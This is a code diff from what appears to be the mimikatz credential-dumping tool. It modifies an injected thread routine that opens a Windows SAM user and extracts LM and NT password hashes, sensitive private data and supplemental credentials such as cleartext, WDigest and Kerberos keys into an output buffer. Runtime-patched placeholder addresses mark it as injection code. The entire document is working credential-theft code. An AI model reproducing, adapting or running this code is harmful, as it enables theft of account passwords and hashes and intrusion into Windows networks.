@@ -9,10 +9,10 @@
 DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter)
 {
 	SAMPR_HANDLE hSam, hDomain, hUser;
-	PPOLICY_ACCOUNT_DOMAIN_INFO pPolicyDomainInfo;
 	DWORD i, credSize = 0;
+	PSAMPR_USER_INFO_BUFFER info = NULL;
 	LSA_SUPCREDENTIALS_BUFFERS buffers[6];
-	
+
 	DWORD kn[][10] = {
 		{0x004C0043, 0x00410045, 0x00540052, 0x00580045, 0x00000054}, // CLEARTEXT
 		{0x00440057, 0x00670069, 0x00730065, 0x00000074}, // WDigest
@@ -30,58 +30,74 @@ DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_DATA lpParameter)
 
 	if(NT_SUCCESS(((PSAMICONNECT) 0x4141414141414141)(NULL, &hSam, 0x10000000, TRUE)))
 	{
-		if(NT_SUCCESS(((PLSAIQUERYINFORMATIONPOLICYTRUSTED) 0x4848484848484848)(PolicyAccountDomainInformation, (PVOID *)(&pPolicyDomainInfo))))
+		if(NT_SUCCESS(((PSAMROPENDOMAIN) 0x4444444444444444)(hSam, 0x10000000, lpParameter->input.inputData/* pPolicyDomainInfo->DomainSid*/, &hDomain)))
 		{
-			if(NT_SUCCESS(((PSAMROPENDOMAIN) 0x4444444444444444)(hSam, 0x10000000, pPolicyDomainInfo->DomainSid, &hDomain)))
+			if(NT_SUCCESS(((PSAMROPENUSER) 0x4545454545454545)(hDomain, 0x10000000, lpParameter->input.inputDword, &hUser)))
 			{
-				if(NT_SUCCESS(((PSAMROPENUSER) 0x4545454545454545)(hDomain, 0x10000000, lpParameter->input.inputDword, &hUser)))
+				for(i = 0; i < 6; i++)
 				{
+					buffers[i].Buffer = NULL;
+					buffers[i].credential.size = 0;
+					buffers[i].credential.type = i;
+					buffers[i].status = STATUS_ABANDONED;
+
+					if(i)
+						buffers[i].status = ((PSAMIRETRIEVEPRIMARYCREDENTIALS) 0x4343434343434343)(hUser, &knu[i-1], &buffers[i].Buffer, &buffers[i].credential.size);
+					else
+					{
+						buffers[i].status = ((PSAMRQUERYINFORMATIONUSER) 0x4646464646464646)(hUser, UserAllInformation, &info);
+						if(NT_SUCCESS(buffers[i].status))
+						{
+							buffers[i].credential.size = FIELD_OFFSET(KIWI_SAMPR_USER_INTERNAL42_INFORMATION, Private) + (info->All.PrivateDataSensitive ? info->All.PrivateData.Length : 0);
+							if(buffers[i].Buffer = ((PLOCALALLOC) 0x4d4d4d4d4d4d4d4d)(LPTR, buffers[i].credential.size))
+							{
+								if(info->All.LmPasswordPresent && (info->All.LmOwfPassword.Length == LM_NTLM_HASH_LENGTH) && info->All.LmOwfPassword.Buffer)
+								{
+									((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.LmPasswordPresent = TRUE;
+									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.LMHash, info->All.LmOwfPassword.Buffer, LM_NTLM_HASH_LENGTH);
+								}
+								if(info->All.NtPasswordPresent && (info->All.NtOwfPassword.Length == LM_NTLM_HASH_LENGTH) && info->All.NtOwfPassword.Buffer)
+								{
+									((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.NtPasswordPresent = TRUE;
+									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.NTHash, info->All.NtOwfPassword.Buffer, LM_NTLM_HASH_LENGTH);
+								}
+								if(info->All.PrivateDataSensitive && info->All.PrivateData.Length && info->All.PrivateData.Buffer)
+								{
+									((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Internal1.PrivateDataSensitive = TRUE;
+									((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->cbPrivate = info->All.PrivateData.Length;
+									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)(((PKIWI_SAMPR_USER_INTERNAL42_INFORMATION) buffers[i].Buffer)->Private, info->All.PrivateData.Buffer, info->All.PrivateData.Length);
+								}
+							}
+							((PSAMIFREE_SAMPR_USER_INFO_BUFFER) 0x4747474747474747)(info, UserAllInformation);
+						}
+					}
+					if(NT_SUCCESS(buffers[i].status) && buffers[i].Buffer && buffers[i].credential.size)
+						credSize += buffers[i].credential.size;
+				}
+
+				lpParameter->output.outputSize = sizeof(LSA_SUPCREDENTIALS) + (6 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
+				if(lpParameter->output.outputData = ((PVIRTUALALLOC) 0x4a4a4a4a4a4a4a4a)(NULL, lpParameter->output.outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
+				{
+					credSize = 0;
+					((PLSA_SUPCREDENTIALS) lpParameter->output.outputData)->count = 6;
 					for(i = 0; i < 6; i++)
 					{
-						buffers[i].Buffer = NULL;
-						buffers[i].credential.size = 0;
-						buffers[i].credential.type = i;
-						buffers[i].status = STATUS_ABANDONED;
-
-						if(i)
-							buffers[i].status = ((PSAMIRETRIEVEPRIMARYCREDENTIALS) 0x4343434343434343)(hUser, &knu[i-1], &buffers[i].Buffer, &buffers[i].credential.size);
-						else
+						if(NT_SUCCESS(buffers[i].status))
 						{
-							buffers[i].credential.size = sizeof(SAMPR_USER_INTERNAL1_INFORMATION);
-							buffers[i].status = ((PSAMRQUERYINFORMATIONUSER) 0x4646464646464646)(hUser, UserInternal1Information, (PSAMPR_USER_INFO_BUFFER *) &buffers[i].Buffer);
-						}
-						if(NT_SUCCESS(buffers[i].status) && buffers[i].Buffer && buffers[i].credential.size)
-							credSize += buffers[i].credential.size;
-					}
-
-					lpParameter->output.outputSize = sizeof(LSA_SUPCREDENTIALS) + (6 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
-					if(lpParameter->output.outputData = ((PVIRTUALALLOC) 0x4a4a4a4a4a4a4a4a)(NULL, lpParameter->output.outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
-					{
-						credSize = 0;
-						((PLSA_SUPCREDENTIALS) lpParameter->output.outputData)->count = 6;
-						for(i = 0; i < 6; i++)
-						{
-							if(NT_SUCCESS(buffers[i].status))
+							if(buffers[i].Buffer && buffers[i].credential.size)
 							{
-								if(buffers[i].Buffer && buffers[i].credential.size)
-								{
-									buffers[i].credential.offset = sizeof(LSA_SUPCREDENTIALS) + (6 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
-									((PLSA_SUPCREDENTIAL) ((PBYTE) lpParameter->output.outputData + sizeof(LSA_SUPCREDENTIALS)))[i] = buffers[i].credential;
-									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) lpParameter->output.outputData + buffers[i].credential.offset, buffers[i].Buffer, buffers[i].credential.size);
-									credSize += buffers[i].credential.size;
-								}
-								if(i)
-									((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(buffers[i].Buffer);
-								else
-									((PSAMIFREE_SAMPR_USER_INFO_BUFFER) 0x4747474747474747)((PSAMPR_USER_INFO_BUFFER) buffers[i].Buffer, UserInternal1Information);
+								buffers[i].credential.offset = sizeof(LSA_SUPCREDENTIALS) + (6 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
+								((PLSA_SUPCREDENTIAL) ((PBYTE) lpParameter->output.outputData + sizeof(LSA_SUPCREDENTIALS)))[i] = buffers[i].credential;
+								((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) lpParameter->output.outputData + buffers[i].credential.offset, buffers[i].Buffer, buffers[i].credential.size);
+								credSize += buffers[i].credential.size;
 							}
+							((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(buffers[i].Buffer);
 						}
 					}
-					((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hUser);
 				}
-				((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hDomain);
+				((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hUser);
 			}
-			((PLSAIFREE_LSAPR_POLICY_INFORMATION) 0x4949494949494949)(PolicyAccountDomainInformation, pPolicyDomainInfo);
+			((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hDomain);
 		}
 		((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hSam);
 	}
